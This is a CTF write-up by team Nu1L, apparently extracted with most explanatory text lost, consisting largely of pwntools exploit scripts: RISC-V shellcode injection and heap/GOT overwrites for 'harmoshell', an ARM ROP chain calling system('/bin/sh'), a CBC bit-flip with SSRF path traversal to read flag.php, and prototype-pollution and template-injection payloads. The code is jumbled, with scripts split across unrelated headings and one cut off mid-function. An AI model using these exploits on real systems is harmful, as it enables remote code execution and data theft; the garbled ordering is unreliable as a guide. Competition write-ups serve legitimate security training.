CTF WriteUp By Nu1L
Author:Nu1L
CTF WriteUp By Nu1L
PWN
harmoshell
harmoshell2
pwn1
RE
crash
re123
ARM
puzzle
WEB
ezlogin
HCIE
RW
harmofs01
luaplayground01 && luaplayground02
MISC
RSP
PWN
harmoshell
echoshellcode
from pwn import *
import fuckpy3
context.log_level = 'debug'
# p = process('./qemu-riscv64 -L ./libs/ ./harmoshell'.split(' '))
# p = process('./qemu-riscv64 -g 1235 -L ./libs/ ./harmoshell'.split(' '))
p = remote('121.37.222.236', 9999)
def launch_gdb():
    raw_input()
def sc(s):
    p.recvuntil('$ ')
    p.sendline(s)
harmoshell2
 Tcache GOT
sc("touch " + 'a'*15)
sc("touch " + 'b'*15)
# sc("cat " + 'a'*16)
sc('echo >> ' + 'a'*15)
sleep(0.1)
# 0x40007ffd40
# shellcode 
='0343a4b79794849b04b27b74849304b234b4849304b622f48493fe913823fe013c23ff010513f
ff02593fff026130dd0089300000073'.unhex()
payload = b''
payload +=p32(0x343a4b7)
payload +=p32(0x9794849b)
payload +=p16(0x04b2      )
payload +=p32(0x7b748493)
payload +=p16(0x04b2      )
payload +=p32(0x34b48493)
payload +=p16(0x04b6      )
payload +=p32(0x22f48493)
payload +=p32(0xfe913823)
payload +=p32(0xfe013c23)
payload +=p32(0xff010513)
payload +=p32(0xfff02593)
payload +=p32(0xfff02613)
payload +=p32(0x0dd00893)
payload +=p32(0x00000073)
shellcode = payload
p.send(shellcode)
sc('echo > ' + 'c'*15)
sleep(0.1)
p.send(shellcode.ljust(0x138,b'a') + p64(0x25f10)) 
p.interactive()
# -*- coding: utf-8 -*-
import sys
from pwn import *
context.log_level ='debug'
# HOST, PORT = "127.0.0.1", "31338"
HOST, PORT = "139.159.132.55", "9999"
p = remote(HOST, PORT)
def touch(para):
    p.sendlineafter('$ ', 'touch '+para)
def rm(para):
    p.sendlineafter('$ ', 'rm '+para)
def cat(para):
    p.sendlineafter('$ ', 'cat '+para)
def ls():
    p.sendlineafter('$ ', 'ls')
def echo(para, cnt):
    p.sendlineafter('$ ', 'echo > '+para)
    p.send(cnt)
def echo2(para, cnt):
    p.sendlineafter('$ ', 'echo >> '+para)
    p.send(cnt)
touch('a')
touch('b')
touch('c')
payload = b''
payload +=p32(0x343a4b7)
payload +=p32(0x9794849b)
payload +=p16(0x04b2)
payload +=p32(0x7b748493)
payload +=p16(0x04b2)
payload +=p32(0x34b48493)
payload +=p16(0x04b6)
payload +=p32(0x22f48493)
payload +=p32(0xfe913823)
payload +=p32(0xfe013c23)
payload +=p32(0xff010513)
payload +=p32(0xfff02593)
payload +=p32(0xfff02613)
payload +=p32(0x0dd00893)
payload +=p32(0x00000073)
shellcode = payload
echo('a', shellcode)
rm('c')
echo('b', 'b'*0x100)
echo2('b', p64(0)+p64(0x31)
    +p64(0x4000800150)+p64(0x4000800155)
    +p64(0x4000800158)+p64(0x100)
    +p64(0x0)+p64(0x111)
    +p64(0x13070))
pwn1
arm
RE
crash
md5
touch('d')
touch('e')
echo('e', p64(0x25f10))
p.interactive()
from pwn import *
s = remote("139.159.210.220","9999")
elf = ELF("./bin")
libc = ELF("./libc-2.31.so")
#csu
payload = cyclic(260)
payload += 
p32(0x10540)+p32(0x2100C)+p32(1)+p32(0x2100C)+p32(0)+p32(0)+p32(0)+p32(0)+p32(0
x10548)
payload += 'A'*28+p32(0x103A8)
s.recvuntil("input: ")
s.send(payload)
#leak
tmp = u32(s.recv(4))
offset = tmp-libc.sym['printf']
#system
pop = offset+0x0006beec
system = libc.sym['system']+offset
sh = next(libc.search('/bin/sh'))+offset
payload = cyclic(260)+p32(pop)+p32(sh)+p32(0)+p32(system)
s.recvuntil("input: ")
s.send(payload)
s.interactive()
from hashlib import md5
import string
re123
Chmdlldll
AESAESflag
ARM
256
puzzle
 884226886224488 
base64
WEB
dec  = ['bf2b36d56f5757c13cad80494b385e78',
'3fe9dbae5dc4408350500affa20074aa',
'1fa6770eca6b57e47a042ffe52eca8ff',
'1aad6b7da1122b4b5a53bf5a4d3b11b0',
'e7b77d9e0ab19fc9ea98154f994fccc5',
'75d9128cfeb61b8949664f6a067f6469',
'd8b0a52c64d6075017b7346140550c46',
'306529c7cdedfb06e27b39f7b2babf4d']
flags = [0] * 8
table = string.printable
table2 = ''
for i in table:
    table2 += chr(ord(i) ^ 0x17)
for i1 in table2:
    for i2 in table2:
        for i3 in table2:
            for i4 in table2:
                if md5(i1+i2+i3+i4).hexdigest() in dec:
                    print(i1+i2+i3+i4,md5(i1+i2+i3+i4).hexdigest())
                    flags[dec.index(md5(i1+i2+i3+i4).hexdigest())] = 
i1+i2+i3+i4
res = ''
for i in flags:
    for j in i:
        res += chr(ord(j) ^ 0x17)
print(res)
flag{define_a_fully-connected_world_with_your_code}
ezlogin
CBC+SSRF
import base64
import urllib
import requests
import re
url="http://121.37.196.163:8080/"
data={
    "username":"admia",
    "password":"12345"
}
tmp="PHPSESSID={}; key={}; user_info={}"
header=requests.post(url,data).headers
PHPSESSID=header["Set-Cookie"].split(";")[0].split("=")[1]
key=urllib.unquote(header["Set-Cookie"].split(";")[1].split(",")[1].split("=")
[1])
user_info=urllib.unquote(header["Set-Cookie"].split(";")[1].split(",")
[2].split("=")[1])
plain=base64.b64decode(user_info)
result=plain[0:13]+chr(ord(plain[13])^ord("n")^ord("a"))+plain[14:]
cookies=tmp.format(urllib.quote(PHPSESSID),urllib.quote(key),urllib.quote(base6
4.b64encode(result)))
text=requests.get(url,headers={"Cookie":cookies}).text
r=re.compile("(.*?)")
tmp=r.findall(text)[0]
plain=base64.b64decode(tmp)
oldiv=base64.b64decode(key)
one='a:2:{s:8:"userna'
iv=""
for i in range(0,16):
    iv=iv+chr(ord(one[i])^ord(plain[i])^ord(oldiv[i]))
ccc=base64.b64encode(iv)
HCIE
 userinfo
flag
RW
harmofs01
seekoffsetsize stdout
FSOP IO  
tmp="PHPSESSID={}; key={}; user_info={}"
result_1=tmp.format(urllib.quote(PHPSESSID),urllib.quote(ccc),urllib.quote(base
64.b64encode(result)))
# print(result_1)
header={
    "Cookie":result_1
}
session=requests.session()
session.get(url,headers=header)
text=session.get(url+"mmman4g.php?
url=FILE://www.harmonyos.com/../../../../../../../../var/www/html/flag.php",hea
ders=header).text
print(text)
xxxx","__proto__": {"isAdmin": 1},"abc":"1
code={{#each this}}{{#each this}}{{{this.toString}}}{{/each}}{{/each}}
from pwn import *
# s = process('./start_qemu.sh')
s = remote("121.37.160.91","32725")
def touch(name,size):
    sleep(0.05)
    s.sendlineafter('Sh > ','touch')
    sleep(0.05)
    s.sendlineafter('File size: ',str(size))
    sleep(0.05)
    s.sendlineafter('File name: ',name)
def readx(name,size):
    sleep(0.05)
    s.sendlineafter('Sh > ','fileop')
    sleep(0.05)